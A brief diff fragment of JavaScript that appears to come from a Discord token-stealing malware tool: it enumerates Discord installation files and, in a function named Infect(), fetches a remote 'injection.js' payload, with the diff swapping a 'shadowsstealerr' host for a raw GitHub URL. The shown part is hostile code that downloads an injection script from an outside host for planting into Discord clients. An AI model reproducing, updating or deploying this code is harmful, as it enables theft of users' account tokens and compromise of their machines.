@@ -36,7 +36,7 @@ discords.forEach(function(file) {
 listDiscords();
 
 function Infect() {
-    https.get('https://shadowsstealerr.netlify.app/', (resp) => {
+    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
